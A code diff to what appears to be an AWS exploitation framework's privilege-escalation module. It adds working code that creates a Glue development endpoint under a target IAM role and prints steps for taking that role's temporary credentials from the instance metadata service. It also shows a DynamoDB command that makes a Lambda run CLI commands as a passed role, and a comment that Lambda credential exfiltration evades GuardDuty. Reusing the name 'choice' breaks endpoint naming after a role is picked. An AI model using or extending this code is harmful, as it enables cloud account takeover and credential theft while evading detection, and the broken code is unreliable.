@@ -1412,12 +1412,14 @@ def PassExistingRoleToNewLambdaThenTriggerWithNewDynamo(pacu_main, print, input,
         return False
 
     print('To make use of the new privileges, you need to invoke the newly created function. To do so, you need to PUT an item into the DynamoDB table {}. You can do this from the AWS CLI. The function expects an AWS CLI command that will execute in the context of the role that was passed to this function.\n\nAn example situation would be where the role you passed has EC2 privileges, so you PUT an item to the new DynamoDB table in the format: attr={S="aws ec2 run-instances --image-id ami-123xyz"} and it will run a new EC2 instance in the current region.\n'.format(dynamo_table_name))
-    print('Example AWS CLI command to invoke the new Lambda function through DynamoDB and execute "aws s3 ls" can be seen here:\n')
-    print('aws dynamodb put-item --region {} --table-name {} --item attr={S="aws s3 ls"}\n'.format(region, dynamo_table_name))
+    print('Example AWS CLI command to invoke the new Lambda function through DynamoDB and execute "aws ec2 run-instances --image-id ami-123xyz" can be seen here:\n')
+    print('aws dynamodb put-item --region {} --table-name {} --item attr={S="aws ec2 run-instances --image-id ami-123xyz"}\n'.format(region, dynamo_table_name))
     print('WARNING: This method does not directly return the output of your AWS CLI command, but there are a couple different options you can take:\n  1. Only run commands that you do not need the output of (such as attaching a policy to your user).\n  2. Review the CloudWatch logs relating to your function invocations, if you have permissions to do so.\n')
     return True
 
 def PassExistingRoleToNewLambdaThenTriggerWithExistingDynamo(pacu_main, print, input, fetch_data):
+    # Use `aws dynamodbstreams list-streams` then try to associate them with an existing table/function? Currently I have a stream but no table or function, so don't want to target that
+    # Credential exfiltration from Lambda does not trigger GuardDuty, so can just create one that POST's the keys to a web server everytime it is triggered
     return
 
 
@@ -1427,7 +1429,7 @@ def pass_existing_role_to_lambda(pacu_main, print, input, fetch_data):
     region = None
 
     if len(regions) > 1:
-        print('  Found multiple valid regions. Choose one below.\n')
+        print('  Found multiple valid regions to use. Choose one below.\n')
         for i in range(0, len(regions)):
             print('  [{}] {}'.format(i, regions[i]))
         choice = input('What region do you want to create the Lambda function in? ')
@@ -1483,7 +1485,84 @@ def pass_existing_role_to_lambda(pacu_main, print, input, fetch_data):
 
 
 def PassExistingRoleToNewGlueDevEndpoint(pacu_main, print, input, fetch_data):
-    return
+    session = pacu_main.get_active_session()
+
+    print('  Starting method PassExistingRoleToNewGlueDevEndpoint...\n')
+
+    pub_ssh_key = input('  Enter your personal SSH public key to access the development endpoint (in the format of an authorized_keys file: ssh-rsa AAASDJHSKH....AAAAA== name) or just hit enter to skip this privilege escalation method: ')
+
+    if pub_ssh_key == '':
+        print('    Skipping to next privilege escalation method...\n')
+        return False
+
+    regions = pacu_main.get_regions('glue')
+    region = None
+
+    if len(regions) > 1:
+        print('  Found multiple valid regions to use. Choose one below.\n')
+        for i in range(0, len(regions)):
+            print('  [{}] {}'.format(i, regions[i]))
+        choice = input('What region do you want to create the Glue development endpoint in? ')
+        region = regions[int(choice)]
+    elif len(regions) == 1:
+        region = regions[0]
+    else:
+        while not region:
+            all_glue_regions = pacu_main.get_regions('glue', check_session=False)
+            region = input('  No valid regions found that the current set of session regions supports. Enter in a region (example: us-west-2) or press enter to skip to the next privilege escalation method: ')
+            if not region:
+                return False
+            elif region not in all_glue_regions:
+                print('    Region {} is not a valid Glue region. Please choose a valid region. Valid Glue regions include:\n'.format(region))
+                print(all_glue_regions)
+                region = None
+
+    client = pacu_main.get_boto3_client('glue', region)
+
+    target_role_arn = input('    Is there a specific role to use? Enter the ARN now or just press enter to enumerate a list of possible roles to choose from: ')
+
+    if not target_role_arn:
+        if fetch_data(['IAM', 'Roles'], 'enum_users_roles_policies_groups', '--roles', force=True) is False:
+            print('Pre-req module not run successfully. Exiting...')
+            return False
+        roles = deepcopy(session.IAM['Roles'])
+
+        print('Found {} roles. Choose one below.'.format(len(roles)))
+        for i in range(0, len(roles)):
+            print('  [{}] {}'.format(i, roles[i]['RoleName']))
+        choice = input('Choose an option: ')
+        target_role_arn = roles[int(choice)]['Arn']
+
+    dev_endpoint_name = ''.join(choice(string.ascii_lowercase + string.digits) for _ in range(10))
+    print('Creating Glue development endpoint {} in region {}...\n'.format(dev_endpoint_name, region))
+
+    try:
+        client.create_dev_endpoint(
+            EndpointName=dev_endpoint_name,
+            RoleArn=target_role_arn,
+            PublicKey=pub_ssh_key,
+            NumberOfNodes=2
+        )
+
+        print('Successfully started creation of the Glue development endpoint {}!\n'.format(dev_endpoint_name))
+        print('Now waiting for it to successfully provision, so you can get the public IP address. This takes about 5 minutes, checking-in every 30 seconds until it is ready...\n')
+
+        while True:
+            response = client.get_dev_endpoint(
+                EndpointName=dev_endpoint_name
+            )
+            if 'PublicAddress' in response['DevEndpoint'] and len(response['DevEndpoint']['PublicAddress']) > 5:
+                break
+            time.sleep(30)
+
+        print('You can now SSH into the server and utilize the AWS CLI to use the permissions of the role, or you can exfiltrate the temporary credentials, which are stored in the EC2 metadata API. Make an HTTP request to "http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy" to get the current credentials. If that does not work, remove "dummy" from the end of that URL to get the name to use instead (it should be "dummy" though).\n')
+        print('WARNING: Glue development endpoints take about five minutes to get up and running, so you will not be able to SSH into the server until then.\n')
+        print('Glue development endpoint details:\n{}\n'.format(json.dumps(response, default=str, indent=2)))
+        return True
+    except Exception as error:
+        print('Failed to create the Glue development endpoint {}: {}\n'.format(dev_endpoint_name, error))
+        return False
+
 
 
 def UpdateExistingGlueDevEndpoint(pacu_main, print, input, fetch_data):
@@ -1492,10 +1571,10 @@ def UpdateExistingGlueDevEndpoint(pacu_main, print, input, fetch_data):
     print('  Starting method UpdateExistingGlueDevEndpoint...\n')
 
     endpoint_name = input('    Is there a specific Glue Development Endpoint you want to target? Enter the name of it now or just hit enter to enumerate development endpoints and view a list of options: ')
-    pub_ssh_key = input('    Enter your personal SSH public key to access the development endpoint (in the format of an authorized_keys file: ssh-rsa AAASDJHSKH....AAAAA== name) or just hit enter to skip this privilege escalation attempt: ')
+    pub_ssh_key = input('    Enter your personal SSH public key to access the development endpoint (in the format of an authorized_keys file: ssh-rsa AAASDJHSKH....AAAAA== name) or just hit enter to skip this privilege escalation method: ')
 
     if pub_ssh_key == '':
-        print('    Skipping UpdateExistingGlueDevEndpoint...')
+        print('    Skipping to next privilege escalation method...\n')
         return False
 
     choice = 0
